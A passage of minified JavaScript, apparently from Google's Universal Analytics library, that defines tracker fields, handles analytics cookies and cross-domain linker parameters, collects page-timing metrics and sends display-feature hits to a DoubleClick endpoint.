  Mt.prototype.get = function (t) {
    var e = zt(t), n = this.data.get(t);
    return e && null == n && (n = d(e.defaultValue) ? e.defaultValue() : e.defaultValue), e && e.Z ? e.Z(this, t, n) : n
  };
  var $t = function (t, e) {
    return null == (t = t.get(e)) ? "" : "" + t
  }, Ut = function (t, e) {
    return null == (t = t.get(e)) || "" === t ? 0 : Number(t)
  };
  Mt.prototype.Z = function (t) {
    return (t = this.get(t)) && d(t) ? t : _
  }, Mt.prototype.set = function (t, e, n) {
    if (t) if ("object" == typeof t) for (var r in t) t.hasOwnProperty(r) && Dt(this, r, t[r], n); else Dt(this, t, e, n)
  };
  var Dt = function (t, e, n, r) {
    if (null != n && e === xn) la.test(n);
    var a = zt(e);
    a && a.o ? a.o(t, e, n, r) : t.data.set(e, n, r)
  }, Gt = {
    hitPayload: 88,
    location: 89,
    referrer: 90,
    title: 91,
    buildHitTask: 93,
    sendHitTask: 94,
    displayFeaturesTask: 95,
    customTask: 97,
    cookieName: 98,
    cookieDomain: 99,
    cookiePath: 100,
    cookieExpires: 101,
    cookieUpdate: 102,
    cookieFlags: 103,
    storage: 104,
    _x_19: 105,
    transportUrl: 106,
    allowAdFeatures: 107,
    sampleRate: 108
  };

  function qt(t, e) {
    var n = Gt[t];
    n && g(n), "displayFeaturesTask" === t && null == e && g(96), /.*Task$/.test(t) && g(92)
  }

  function Ft(t, e) {
    if (t) if ("object" == typeof t) for (var n in t) t.hasOwnProperty(n) && qt(n, e); else qt(t, e)
  }

  var Ht = new R, Vt = [], Bt = function (t, e, n, r, a) {
    this.name = t, this.F = e, this.Z = r, this.o = a, this.defaultValue = n
  }, zt = function (t) {
    var e = Ht.get(t);
    if (!e) for (var n = 0; n < Vt.length; n++) {
      var r = Vt[n], a = r[0].exec(t);
      if (a) {
        e = r[1](a), Ht.set(e.name, e);
        break
      }
    }
    return e
  }, Kt = function (t, e, n, r, a) {
    return t = new Bt(t, e, n, r, a), Ht.set(t.name, t), t.name
  }, Xt = function (t, e) {
    Vt.push([new RegExp("^" + t + "$"), e])
  }, Wt = function (t, e, n) {
    return Kt(t, e, n, void 0, Zt)
  }, Zt = function () {
  }, Yt = Wt("apiVersion", "v"), Jt = Wt("clientVersion", "_v");
  Kt("anonymizeIp", "aip");
  var Qt = Kt("adSenseId", "a"), te = Kt("hitType", "t"), ee = Kt("hitCallback"), ne = Kt("hitPayload");
  Kt("nonInteraction", "ni"), Kt("currencyCode", "cu"), Kt("dataSource", "ds");
  var re = Kt("useBeacon", void 0, !1), ae = Kt("transport");
  Kt("sessionControl", "sc", ""), Kt("sessionGroup", "sg"), Kt("queueTime", "qt");
  var ie = Kt("_s", "_s"), oe = Kt("_no_slc");
  Kt("screenName", "cd");
  var se = Kt("location", "dl", ""), ce = Kt("referrer", "dr"), ue = Kt("page", "dp", "");
  Kt("hostname", "dh");
  var le = Kt("language", "ul"), ge = Kt("encoding", "de");
  Kt("title", "dt", (function () {
    return L.title || void 0
  })), Xt("contentGroup([0-9]+)", (function (t) {
    return new Bt(t[0], "cg" + t[1])
  }));
  var fe = Kt("screenColors", "sd"), he = Kt("screenResolution", "sr"), de = Kt("viewportSize", "vp"),
    pe = Kt("javaEnabled", "je"), ve = Kt("flashVersion", "fl");
  Kt("campaignId", "ci"), Kt("campaignName", "cn"), Kt("campaignSource", "cs"), Kt("campaignMedium", "cm"), Kt("campaignKeyword", "ck"), Kt("campaignContent", "cc");
  var me = Kt("eventCategory", "ec"), we = Kt("eventAction", "ea"), _e = Kt("eventLabel", "el"),
    be = Kt("eventValue", "ev"), ye = Kt("socialNetwork", "sn"), ke = Kt("socialAction", "sa"),
    xe = Kt("socialTarget", "st"), Te = Kt("l1", "plt"), Oe = Kt("l2", "pdt"), Se = Kt("l3", "dns"),
    Ce = Kt("l4", "rrt"), Ae = Kt("l5", "srt"), Ee = Kt("l6", "tcp"), Ne = Kt("l7", "dit"), je = Kt("l8", "clt"),
    Re = Kt("l9", "_gst"), Ie = Kt("l10", "_gbt"), Le = Kt("l11", "_cst"), Pe = Kt("l12", "_cbt"),
    Me = Kt("timingCategory", "utc"), $e = Kt("timingVar", "utv"), Ue = Kt("timingLabel", "utl"),
    De = Kt("timingValue", "utt");
  Kt("appName", "an"), Kt("appVersion", "av", ""), Kt("appId", "aid", ""), Kt("appInstallerId", "aiid", ""), Kt("exDescription", "exd"), Kt("exFatal", "exf");
  var Ge = Kt("expId", "xid"), qe = Kt("expVar", "xvar"), Fe = Kt("exp", "exp"), He = Kt("_utma", "_utma"),
    Ve = Kt("_utmz", "_utmz"), Be = Kt("_utmht", "_utmht"), ze = Kt("_hc", void 0, 0), Ke = Kt("_ti", void 0, 0),
    Xe = Kt("_to", void 0, 20);
  Xt("dimension([0-9]+)", (function (t) {
    return new Bt(t[0], "cd" + t[1])
  })), Xt("metric([0-9]+)", (function (t) {
    return new Bt(t[0], "cm" + t[1])
  })), Kt("linkerParam", void 0, void 0, (function (t) {
    if (t.get(We)) return g(35), Pr.generate(Br(t));
    var e = $t(t, _n), n = $t(t, Un) || "";
    return e = "_ga=2." + b(Dr(n + e, 0) + "." + n + "-" + e), (t = zr(t)) ? (g(44), t = "&_gac=1." + b([Dr(t.qa, 0), t.timestamp, t.qa].join("."))) : t = "", e + t
  }), Zt);
  var We = Wt("_cd2l", void 0, !1), Ze = Kt("usage", "_u"), Ye = Kt("_um");
  Kt("forceSSL", void 0, void 0, (function () {
    return u
  }), (function (t, e, n) {
    g(34), u = !!n
  }));
  var Je = Kt("_j1", "jid"), Qe = Kt("_j2", "gjid");
  Xt("\\&(.*)", (function (t) {
    var e = new Bt(t[0], t[1]), n = function (t) {
      var e;
      return Ht.map((function (n, r) {
        r.F == t && (e = r)
      })), e && e.name
    }(t[0].substring(1));
    return n && (e.Z = function (t) {
      return t.get(n)
    }, e.o = function (t, e, r, a) {
      t.set(n, r, a)
    }, e.F = void 0), e
  }));
  var tn = Wt("_oot"), en = Kt("previewTask"), nn = Kt("checkProtocolTask"), rn = Kt("validationTask"),
    an = Kt("checkStorageTask"), on = Kt("historyImportTask"), sn = Kt("samplerTask"), cn = Kt("_rlt"),
    un = Kt("buildHitTask"), ln = Kt("sendHitTask"), gn = Kt("ceTask"), fn = Kt("devIdTask"), hn = Kt("timingTask"),
    dn = Kt("displayFeaturesTask"), pn = Kt("customTask"), vn = Kt("fpsCrossDomainTask"), mn = Wt("_cta"),
    wn = Wt("name"), _n = Wt("clientId", "cid"), bn = Wt("clientIdTime"), yn = Wt("storedClientId"),
    kn = Kt("userId", "uid"), xn = Wt("trackingId", "tid"), Tn = Wt("cookieName", void 0, "_ga"),
    On = Wt("cookieDomain"), Sn = Wt("cookiePath", void 0, "/"), Cn = Wt("cookieExpires", void 0, 63072e3),
    An = Wt("cookieUpdate", void 0, !0), En = Wt("cookieFlags", void 0, ""), Nn = Wt("legacyCookieDomain"),
    jn = Wt("legacyHistoryImport", void 0, !0), Rn = Wt("storage", void 0, "cookie"),
    In = Wt("allowLinker", void 0, !1), Ln = Wt("allowAnchor", void 0, !0), Pn = Wt("sampleRate", "sf", 100),
    Mn = Wt("siteSpeedSampleRate", void 0, 1), $n = Wt("alwaysSendReferrer", void 0, !1), Un = Wt("_gid", "_gid"),
    Dn = Wt("_gcn"), Gn = Wt("useAmpClientId"), qn = Wt("_gclid"), Fn = Wt("_gt"), Hn = Wt("_ge", void 0, 7776e6),
    Vn = Wt("_gclsrc"), Bn = Wt("storeGac", void 0, !0), zn = Kt("_x_19"), Kn = Kt("_fplc", "_fplc"), Xn = Wt("_cs"),
    Wn = Wt("_useUp", void 0, !1), Zn = Kt("up", "up"), Yn = Kt("_tac", void 0, !1), Jn = Wt("_gbraid"),
    Qn = Wt("_gbt"), tr = Wt("_gbe", void 0, 7776e6), er = Kt("transportUrl"), nr = Kt("_r", "_r"),
    rr = Kt("_slc", "_slc"), ar = Kt("_dp"), ir = Kt("_jt", void 0, "n"), or = Kt("allowAdFeatures", void 0, !0),
    sr = Kt("allowAdPersonalizationSignals", void 0, !0);

  function cr(t, e, n, r) {
    e[t] = function () {
      try {
        return r && g(r), n.apply(this, arguments)
      } catch (e) {
        throw wt("exc", t, e && e.name), e
      }
    }
  }

  var ur = function (t) {
    if ("cookie" == t.get(Rn)) return 0 < (t = G("FPLC")).length ? t[0] : void 0
  }, lr = function (t) {
    var e;
    (e = $t(t, zn) && t.get(We)) && (e = !((e = Pr.get(t.get(Ln))) && e._fplc)), e && !ur(t) && t.set(Kn, "0")
  }, gr = function (t) {
    var e = {};
    if (fr(e) || hr(e)) {
      var n = e[Te];
      null == n || 1 / 0 == n || isNaN(n) || (0 < n ? (dr(e, Se), dr(e, Ee), dr(e, Ae), dr(e, Oe), dr(e, Ce), dr(e, Ne), dr(e, je), dr(e, Re), dr(e, Ie), dr(e, Le), dr(e, Pe), M((function () {
        t(e)
      }), 10)) : y(I, "load", (function () {
        gr(t)
      }), !1))
    }
  }, fr = function (t) {
    var e = I.performance || I.webkitPerformance;
    if (!(e = e && e.timing)) return !1;
    var n = e.navigationStart;
    return 0 != n && (t[Te] = e.loadEventStart - n, t[Se] = e.domainLookupEnd - e.domainLookupStart, t[Ee] = e.connectEnd - e.connectStart, t[Ae] = e.responseStart - e.requestStart, t[Oe] = e.responseEnd - e.responseStart, t[Ce] = e.fetchStart - n, t[Ne] = e.domInteractive - n, t[je] = e.domContentLoadedEventStart - n, t[Re] = La.L - n, t[Ie] = La.ya - n, I.google_tag_manager && I.google_tag_manager._li && (e = I.google_tag_manager._li, t[Le] = e.cst, t[Pe] = e.cbt), !0)
  }, hr = function (t) {
    if (I.top != I) return !1;
    var e = I.external, n = e && e.onloadT;
    return e && !e.isValidLoadTime && (n = void 0), 2147483648 < n && (n = void 0), 0 < n && e.setPageReadyTime(), null != n && (t[Te] = n, !0)
  }, dr = function (t, e) {
    var n = t[e];
    (isNaN(n) || 1 / 0 == n || 0 > n) && (t[e] = void 0)
  }, pr = function (e) {
    return function (n) {
      if ("pageview" == n.get(te) && !e.I) {
        e.I = !0;
        var r = function (e) {
          var n = Math.min(Ut(e, Mn), 100);
          return !(t($t(e, _n)) % 100 >= n)
        }(n), a = 0 < C($t(n, se), "gclid").length, i = 0 < C($t(n, se), "wbraid").length;
        (r || a || i) && gr((function (t) {
          r && e.send("timing", t), (a || i) && e.send("adtiming", t)
        }))
      }
    }
  }, vr = !1, mr = function (t) {
    if ("cookie" == $t(t, Rn)) {
      if (t.get(An) || $t(t, yn) != $t(t, _n)) {
        var e = 1e3 * Ut(t, Cn);
        wr(t, _n, Tn, e), t.data.set(yn, $t(t, _n))
      }
      if ((t.get(An) || _r(t) != $t(t, Un)) && wr(t, Un, Dn, 864e5), t.get(Bn)) {
        if (e = $t(t, qn)) {
          var n = Math.min(Ut(t, Hn), 1e3 * Ut(t, Cn));
          n = 0 === n ? 0 : Math.min(n, 1e3 * Ut(t, Fn) + n - (new Date).getTime()), t.data.set(Hn, n);
          var r = {}, a = $t(t, Fn), i = $t(t, Vn), o = Ar($t(t, Sn)), s = Sr($t(t, On)), c = $t(t, xn), u = $t(t, En);
          i && "aw.ds" != i ? r && (r.ua = !0) : (e = ["1", a, F(e)].join("."), 0 <= n && (r && (r.ta = !0), q("_gac_" + F(c), e, o, s, c, n, u))), Nr(r)
        }
      } else g(75);
      t.get(Bn) && (e = $t(t, Jn)) && (n = 0 === (n = Math.min(Ut(t, tr), 1e3 * Ut(t, Cn))) ? 0 : Math.min(n, 1e3 * Ut(t, Qn) + n - (new Date).getTime()), t.data.set(tr, n), r = {}, u = $t(t, Qn), o = Ar($t(t, Sn)), s = Sr($t(t, On)), c = $t(t, xn), t = $t(t, En), e = ["1", u, F(e)].join("."), 0 <= n && (r && (r.ta = !0), q("_gac_gb_" + F(c), e, o, s, c, n, t)), jr(r))
    }
  }, wr = function (t, e, n, r) {
    var a = kr(t, e);
    if (a) {
      n = $t(t, n);
      var i = Ar($t(t, Sn)), o = Sr($t(t, On)), s = $t(t, En), c = $t(t, xn);
      if ("auto" != o) q(n, a, i, o, c, r, s) && (vr = !0); else {
        g(32);
        for (var u = Cr(), l = 0; l < u.length; l++) if (o = u[l], t.data.set(On, o), a = kr(t, e), q(n, a, i, o, c, r, s)) return void (vr = !0);
        t.data.set(On, "auto")
      }
    }
  }, _r = function (t) {
    var e = G($t(t, Dn));
    return xr(t, e)
  }, br = function (t) {
    if ("cookie" == $t(t, Rn) && !vr && (mr(t), !vr)) throw"abort"
  }, yr = function (t) {
    if (t.get(jn)) {
      var e = $t(t, On), n = $t(t, Nn) || A(), r = Rr("__utma", n, e);
      r && (g(19), t.set(Be, (new Date).getTime(), !0), t.set(He, r.R), (e = Rr("__utmz", n, e)) && r.hash == e.hash && t.set(Ve, e.R))
    }
  }, kr = function (t, e) {
    e = F($t(t, e));
    var n = Sr($t(t, On)).split(".").length;
    return 1 < (t = Er($t(t, Sn))) && (n += "-" + t), e ? ["GA1", n, e].join(".") : ""
  }, xr = function (t, e) {
    return Tr(e, $t(t, On), $t(t, Sn))
  }, Tr = function (t, e, n) {
    if (!t || 1 > t.length) g(12); else {
      for (var r = [], a = 0; a < t.length; a++) {
        var i = t[a], o = i.split("."), s = o.shift();
        ("GA1" == s || "1" == s) && 1 < o.length ? (1 == (i = o.shift().split("-")).length && (i[1] = "1"), i[0] *= 1, i[1] *= 1, o = {
          H: i,
          s: o.join(".")
        }) : o = c.test(i) ? {H: [0, 0], s: i} : void 0, o && r.push(o)
      }
      if (1 == r.length) return g(13), r[0].s;
      if (0 != r.length) return g(14), 1 == (r = Or(r, Sr(e).split(".").length, 0)).length ? r[0].s : (1 < (r = Or(r, Er(n), 1)).length && g(41), r[0] && r[0].s);
      g(12)
    }
  }, Or = function (t, e, n) {
    for (var r, a = [], i = [], o = 0; o < t.length; o++) {
      var s = t[o];
      s.H[n] == e ? a.push(s) : null == r || s.H[n] < r ? (i = [s], r = s.H[n]) : s.H[n] == r && i.push(s)
    }
    return 0 < a.length ? a : i
  }, Sr = function (t) {
    return 0 == t.indexOf(".") ? t.substr(1) : t
  }, Cr = function () {
    var t = [], e = A().split(".");
    if (4 == e.length) {
      var n = e[e.length - 1];
      if (parseInt(n, 10) == n) return ["none"]
    }
    for (n = e.length - 2; 0 <= n; n--) t.push(e.slice(n).join("."));
    return e = L.location.hostname, V.test(e) || H.test(e) || t.push("none"), t
  }, Ar = function (t) {
    return t ? (1 < t.length && t.lastIndexOf("/") == t.length - 1 && (t = t.substr(0, t.length - 1)), 0 != t.indexOf("/") && (t = "/" + t), t) : "/"
  }, Er = function (t) {
    return "/" == (t = Ar(t)) ? 1 : t.split("/").length
  }, Nr = function (t) {
    t.ta && g(77), t.na && g(74), t.pa && g(73), t.ua && g(69)
  }, jr = function (t) {
    t.ta && g(85), t.na && g(86), t.pa && g(87)
  };

  function Rr(t, e, n) {
    "none" == e && (e = "");
    var r = [], a = G(t);
    t = "__utma" == t ? 6 : 2;
    for (var i = 0; i < a.length; i++) {
      var o = ("" + a[i]).split(".");
      o.length >= t && r.push({hash: o[0], R: a[i], O: o})
    }
    if (0 != r.length) return 1 == r.length ? r[0] : Ir(e, r) || Ir(n, r) || Ir(null, r) || r[0]
  }

  function Ir(e, n) {
    if (null == e) var r = e = 1; else r = t(e), e = t(m(e, ".") ? e.substring(1) : "." + e);
    for (var a = 0; a < n.length; a++) if (n[a].hash == r || n[a].hash == e) return n[a]
  }

  var Lr = new RegExp(/^https?:\/\/([^\/:]+)/), Pr = I.google_tag_data.glBridge,
    Mr = RegExp("(.*)([?&#])(?:_ga=[^&#]*)(?:&?)(.*)"), $r = RegExp("(.*)([?&#])(?:_gac=[^&#]*)(?:&?)(.*)");

  function Ur(e, n) {
    var r = new Date, a = I.navigator, i = a.plugins || [];
    for (e = [e, a.userAgent, r.getTimezoneOffset(), r.getYear(), r.getDate(), r.getHours(), r.getMinutes() + n], n = 0; n < i.length; ++n) e.push(i[n].description);
    return t(e.join("."))
  }

  function Dr(e, n) {
    var r = new Date, a = I.navigator, i = r.getHours() + Math.floor((r.getMinutes() + n) / 60);
    return t([e, a.userAgent, a.language || "", r.getTimezoneOffset(), r.getYear(), r.getDate() + Math.floor(i / 24), (24 + i) % 24, (60 + r.getMinutes() + n) % 60].join("."))
  }

  var Gr = function (t) {
    g(48), this.target = t, this.T = !1
  };
  Gr.prototype.ca = function (t, e) {
    if (t) {
      if (this.target.get(We)) return Pr.decorate(Br(this.target), t, e);
      if (t.tagName) {
        if ("a" == t.tagName.toLowerCase()) return void (t.href && (t.href = qr(this, t.href, e)));
        if ("form" == t.tagName.toLowerCase()) return Fr(this, t)
      }
      if ("string" == typeof t) return qr(this, t, e)
    }
  };
  var qr = function (t, e, n) {
    var r = Mr.exec(e);
    r && 3 <= r.length && (e = r[1] + (r[3] ? r[2] + r[3] : "")), (r = $r.exec(e)) && 3 <= r.length && (e = r[1] + (r[3] ? r[2] + r[3] : "")), t = t.target.get("linkerParam"), r = e.indexOf("?");
    var a = e.indexOf("#");
    return (e = (e = n ? e + (-1 == a ? "#" : "&") + t : -1 == a ? e + (-1 === r ? "?" : "&") + t : e.substring(0, a) + (-1 === r || r > a ? "?" : "&") + t + e.substring(a)).replace(/&+_ga=/, "&_ga=")).replace(RegExp("&+_gac="), "&_gac=")
  }, Fr = function (t, e) {
    if (e && e.action) if ("get" == e.method.toLowerCase()) {
      t = t.target.get("linkerParam").split("&");
      for (var n = 0; n < t.length; n++) {
        var r = t[n].split("="), a = r[1];
        r = r[0];
        for (var i = e.childNodes || [], o = !1, s = 0; s < i.length; s++) if (i[s].name == r) {
          i[s].setAttribute("value", a), o = !0;
          break
        }
        o || ((i = L.createElement("input")).setAttribute("type", "hidden"), i.setAttribute("name", r), i.setAttribute("value", a), e.appendChild(i))
      }
    } else "post" == e.method.toLowerCase() && (e.action = qr(t, e.action))
  };

  function Hr(t, e) {
    if (e == L.location.hostname) return !1;
    for (var n = 0; n < t.length; n++) if (t[n] instanceof RegExp) {
      if (t[n].test(e)) return !0
    } else if (0 <= e.indexOf(t[n])) return !0;
    return !1
  }

  function Vr(t, e) {
    return e != Ur(t, 0) && e != Ur(t, -1) && e != Ur(t, -2) && e != Dr(t, 0) && e != Dr(t, -1) && e != Dr(t, -2)
  }

  function Br(t) {
    var e = zr(t), n = {};
    return n._ga = t.get(_n), n._gid = t.get(Un) || void 0, n._gac = e ? [e.qa, e.timestamp].join(".") : void 0, e = t.get(Kn), t = ur(t), n._fplc = e && "0" !== e ? e : t, n
  }

  function zr(t) {
    function e(t) {
      return null == t || "" === t ? 0 : Number(t)
    }

    var n = t.get(qn);
    if (n && t.get(Bn)) {
      var r = e(t.get(Fn));
      if (!(1e3 * r + e(t.get(Hn)) <= (new Date).getTime())) return {timestamp: r, qa: n};
      g(76)
    }
  }

  Gr.prototype.S = function (t, e, n) {
    function r(n) {
      try {
        n = n || I.event;
        t:{
          var r = n.target || n.srcElement;
          for (n = 100; r && 0 < n;) {
            if (r.href && r.nodeName.match(/^a(?:rea)?$/i)) {
              var i = r;
              break t
            }
            r = r.parentNode, n--
          }
          i = {}
        }
        ("http:" == i.protocol || "https:" == i.protocol) && Hr(t, i.hostname || "") && i.href && (i.href = qr(a, i.href, e))
      } catch (t) {
        g(26)
      }
    }

    var a = this;
    this.target.get(We) ? Pr.auto((function () {
      return Br(a.target)
    }), t, e ? "fragment" : "", n) : (this.T || (this.T = !0, y(L, "mousedown", r, !1), y(L, "keyup", r, !1)), n && y(L, "submit", (function (e) {
      if ((e = (e = e || I.event).target || e.srcElement) && e.action) {
        var n = e.action.match(Lr);
        n && Hr(t, n[1]) && Fr(a, e)
      }
    })))
  }, Gr.prototype.$ = function (t) {
    if (t) {
      var e = this, n = e.target.get(Xn);
      void 0 !== n && Pr.passthrough((function () {
        if (n("analytics_storage")) return {};
        var t = {};
        return t._ga = e.target.get(_n), t._up = "1", t
      }), 1, !0)
    }
  };
  var Kr = /^(GTM|OPT)-[A-Z0-9]+$/, Xr = /;_gaexp=[^;]*/g, Wr = /;((__utma=)|([^;=]+=GAX?\d+\.))[^;]*/g,
    Zr = /^https?:\/\/[\w\-.]+\.google.com(:\d+)?\/optimize\/opt-launch\.html\?.*$/, Yr = 0,
    Jr = function (t, e, n, r) {
      if (n = n || {}, Kr.test(e)) var a = 1; else {
        var i = e.split("-");
        1 < i.length && "GTM" !== i[0] && "UA" !== i[0] && (a = 2)
      }
      if (a) {
        i = {id: e, type: a, B: n.dataLayer || "dataLayer", G: !1};
        var o = void 0;
        switch (t.get("&gtm") == e && (i.G = !0), a) {
          case 1:
            i.ia = !!t.get("anonymizeIp"), i.sync = r, "t0" != (e = String(t.get("name"))) && (i.target = e), D(String(t.get("trackingId"))) || (i.clientId = String(t.get(_n)), i.ka = Number(t.get(bn)), n = n.palindrome ? Wr : Xr, n = (n = L.cookie.replace(/^|(; +)/g, ";").match(n)) ? n.sort().join("").substring(1) : void 0, i.la = n, i.qa = C($t(t, se), "gclid"));
            break;
          case 2:
            if (20 <= Yr) return;
            Yr++, i.context = "c", (t = {}).is_legacy_loaded = !0, o = t, i.sa = !0
        }
        return function (t, e) {
          var n = (new Date).getTime();
          I[t.B] = I[t.B] || [], n = {"gtm.start": n}, t.sync || (n.event = "gtm.js"), I[t.B].push(n), 2 === t.type && function (e, n, r) {
            I[t.B].push(arguments)
          }("config", t.id, e)
        }(i, o), function (t) {
          function e(t, e) {
            e && (n += "&" + t + "=" + b(e))
          }

          var n = ut(t.type) + b(t.id);
          return "dataLayer" != t.B && e("l", t.B), e("cx", t.context), e("t", t.target), e("cid", t.clientId), e("cidt", t.ka), e("gac", t.la), e("aip", t.ia), t.sa && e("_slc", "1"), t.sync && e("m", "sync"), e("cycle", t.G), t.qa && e("gclid", t.qa), Zr.test(L.referrer) && e("cb", String(It())), n
        }(i)
      }
    }, Qr = {}, ta = function (t, e) {
      e || (e = (e = $t(t, wn)) && "t0" != e ? sa.test(e) ? "_gat_" + F($t(t, xn)) : "_gat_" + F(e) : "_gat"), this.Y = e
    }, ea = function (t, e, n) {
      !1 === e.get(or) || e.get(n) || ("1" == G(t.Y)[0] ? e.set(n, "", !0) : e.set(n, "" + It(), !0))
    }, na = function (t, e) {
      ra(e) && q(t.Y, "1", $t(e, Sn), $t(e, On), $t(e, xn), 6e4, $t(e, En))
    }, ra = function (t) {
      return !!t.get(Je) && !1 !== t.get(or)
    }, aa = function (t) {
      return !Qr[$t(t, xn)] && void 0 === t.get(oe) && void 0 === t.get(ae) && void 0 === t.get(er) && void 0 === t.get(zn)
    }, ia = function (t, e) {
      var n = new R, r = function (e) {
        zt(e).F && n.set(zt(e).F, t.get(e))
      };
      r(Yt), r(Jt), r(xn), r(_n), r(Je), 1 == e && (r(kn), r(Qe), r(Un)), !1 === t.get(sr) && n.set("npa", "1"), n.set(zt(Ze).F, f(t));
      var a = "";
      return n.map((function (t, e) {
        a += b(t) + "=", a += b("" + e) + "&"
      })), a += "z=" + It(), 1 == e ? a = "t=dc&aip=1&_r=3&" + a : 2 == e && (a = "t=sr&aip=1&_r=4&slf_rd=1&" + a), a
    }, oa = function (t) {
      if (aa(t)) return Qr[$t(t, xn)] = !0, function (e) {
        if (e && !Qr[e]) {
          var n = Jr(t, e);
          n && (O(n), Qr[e] = !0)
        }
      }
    }, sa = /^gtm\d+$/, ca = function (t, n) {
      if (!(t = t.model).get("dcLoaded")) {
        var r, a = new e(h(t));
        a.set(29), t.set(Ye, a.C), (n = n || {})[Tn] && (r = F(n[Tn])), function (t, e) {
          var n = e.get(un);
          e.set(un, (function (e) {
            ea(t, e, Je), ea(t, e, Qe);
            var r = n(e);
            return na(t, e), r
          }));
          var r = e.get(ln);
          e.set(ln, (function (t) {
            var e = r(t);
            if (ra(t)) {
              g(80);
              var n = {U: ia(t, 1), google: ia(t, 2), count: 0};
              ft("https://stats.g.doubleclick.net/j/collect", n.U, n), t.set(Je, "", !0)
            }
            return e
          }))
        }(n = new ta(t, r), t), t.set("dcLoaded", !0)
      }
    }, ua = function (t) {
      if (!t.get("dcLoaded") && "cookie" == t.get(Rn)) {
        var e = new ta(t);
        ea(e, t, Je), ea(e, t, Qe), na(e, t), e = ra(t);
        var n = aa(t);
        e && t.set(nr, 1, !0), n && t.set(rr, 1, !0), (e || n) && (t.set(ir, "d", !0), g(79), t.set(ar, {
          U: ia(t, 1),
          google: ia(t, 2),
          V: oa(t),
          count: 0
        }, !0))
      }
    }, la = /^(UA|YT|MO|GP)-(\d+)-(\d+)$/, ga = function (t) {
      function e(e, n) {
        r.model.data.set(e, n), t.hasOwnProperty(e) && qt(e, n)
      }

      function n(t, e) {
        r.model.data.set(t, e), r.filters.add(t)
      }

      var r = this;
      this.model = new Mt, this.filters = new yt, e(wn, t[wn]), e(xn, function (t) {
        return t ? t.replace(/^[\s\xa0]+|[\s\xa0]+$/g, "") : ""
      }(t[xn])), e(Tn, t[Tn]), e(On, t[On] || A()), e(Sn, t[Sn]), e(Cn, t[Cn]), e(An, t[An]), e(En, t[En]), e(Nn, t[Nn]), e(jn, t[jn]), e(In, t[In]), e(Ln, t[Ln]), e(Pn, t[Pn]), e(Mn, t[Mn]), e($n, t[$n]), e(Rn, t[Rn]), e(kn, t[kn]), e(bn, t[bn]), e(Gn, t[Gn]), e(Bn, t[Bn]), e(We, t[We]), e(zn, t[zn]), e(Wn, t[Wn]), e(Xn, t[Xn]), e(Yt, 1), e(Jt, "j99"), n(mn, jt), n(tn, xt), n(pn, _), n(en, At), n(nn, Tt), n(rn, Nt), n(an, br), n(on, yr), n(sn, kt), n(cn, Pt), n(gn, Ct), n(fn, Et), n(dn, ua), n(vn, lr), n(un, Ot), n(ln, St), n(hn, pr(this)), ma(this.model), va(this.model, t[_n]), this.model.set(Qt, function () {
        var t = I.gaGlobal = I.gaGlobal || {};
        return t.hid = t.hid || It()
      }())
    };
  ga.prototype.get = function (t) {
    return this.model.get(t)
  }, ga.prototype.set = function (t, e) {
    this.model.set(t, e), Ft(t, e)
  }, ga.prototype.send = function (t) {
    if (!(1 > arguments.length)) {
      if ("string" == typeof arguments[0]) var e = arguments[0],
        n = [].slice.call(arguments, 1); else e = arguments[0] && arguments[0][te], n = arguments;
      e && ((n = N(wa[e] || [], n))[te] = e, Ft(n), this.model.set(n, void 0, !0), this.filters.D(this.model), this.model.data.m = {})
    }
  }, ga.prototype.ma = function (t, e) {
    var n = this;
    Ta(t, n, e) || (Sa(t, (function () {
      Ta(t, n, e)
    })), Oa(String(n.get(wn)), t, void 0, e, !0))
  };
  var fa, ha, da, pa, va = function (t, e) {
    var n = $t(t, Tn);
    if (t.data.set(Dn, "_ga" == n ? "_gid" : n + "_gid"), "cookie" == $t(t, Rn)) {
      if (vr = !1, n = G($t(t, Tn)), !(n = xr(t, n))) {
        n = $t(t, On);
        var r = $t(t, Nn) || A();
        null != (n = Rr("__utma", r, n)) ? (g(10), n = n.O[1] + "." + n.O[2]) : n = void 0
      }
      if (n && (vr = !0), r = n && !t.get(An)) if (2 != (r = n.split(".")).length) r = !1; else if (r = Number(r[1])) {
        var a = Ut(t, Cn);
        r = r + a < (new Date).getTime() / 1e3
      } else r = !1;
      r && (n = void 0), n && (t.data.set(yn, n), t.data.set(_n, n), (n = _r(t)) && t.data.set(Un, n)), t.get(Bn) && (n = t.get(qn), r = t.get(Vn), !n || r && "aw.ds" != r) && (n = {}, r = (L ? z(n) : {})[$t(t, xn)], Nr(n), r && 0 != r.length && (n = r[0], t.data.set(Fn, n.timestamp / 1e3), t.data.set(qn, n.qa))), t.get(Bn) && (n = t.get(Jn), r = {}, a = (L ? z(r, "_gac_gb", !0) : {})[$t(t, xn)], jr(r), a && 0 != a.length && (a = (r = a[0]).qa, n && n !== a || (r.labels && r.labels.length && (a += "." + r.labels.join(".")), t.data.set(Qn, r.timestamp / 1e3), t.data.set(Jn, a))))
    }
    if (t.get(An)) {
      n = S("_ga", !!t.get(Ln));
      var i = S("_gl", !!t.get(Ln));
      if (a = (r = Pr.get(t.get(Ln)))._ga, i && 0 < i.indexOf("_ga*") && !a && g(30), e || !t.get(Wn)) i = !1; else if (void 0 === (i = t.get(Xn)) || i("analytics_storage")) i = !1; else {
        if (g(84), t.data.set(Zn, 1), i = r._up) if (i = Lr.exec(L.referrer)) {
          i = i[1];
          var o = L.location.hostname;
          i = o === i || 0 <= o.indexOf("." + i) || 0 <= i.indexOf("." + o)
        } else i = !1;
        i = !!i
      }
      o = r.gclid;
      var c = r._gac;
      if (n || a || o || c) if (n && a && g(36), t.get(In) || st(t.get(Gn)) || i) {
        if (a && (g(38), t.data.set(_n, a), r._gid && (g(51), t.data.set(Un, r._gid))), o ? (g(82), t.data.set(qn, o), r.gclsrc && t.data.set(Vn, r.gclsrc)) : c && (a = c.split(".")) && 2 === a.length && (g(37), t.data.set(qn, a[0]), t.data.set(Fn, a[1])), (r = r._fplc) && $t(t, zn) && (g(83), t.data.set(Kn, r)), n) t:if (r = n.indexOf("."), -1 == r) g(22); else {
          if (a = n.substring(0, r), r = (i = n.substring(r + 1)).indexOf("."), n = i.substring(0, r), i = i.substring(r + 1), "1" == a) {
            if (Vr(r = i, n)) {
              g(23);
              break t
            }
          } else {
            if ("2" != a) {
              g(22);
              break t
            }
            if (a = "", 0 < (r = i.indexOf("-")) ? (a = i.substring(0, r), r = i.substring(r + 1)) : r = i.substring(1), Vr(a + r, n)) {
              g(53);
              break t
            }
            a && (g(2), t.data.set(Un, a))
          }
          g(11), t.data.set(_n, r), (n = S("_gac", !!t.get(Ln))) && ("1" != (n = n.split("."))[0] || 4 != n.length ? g(72) : Vr(n[3], n[1]) ? g(71) : (t.data.set(qn, n[3]), t.data.set(Fn, n[2]), g(70)))
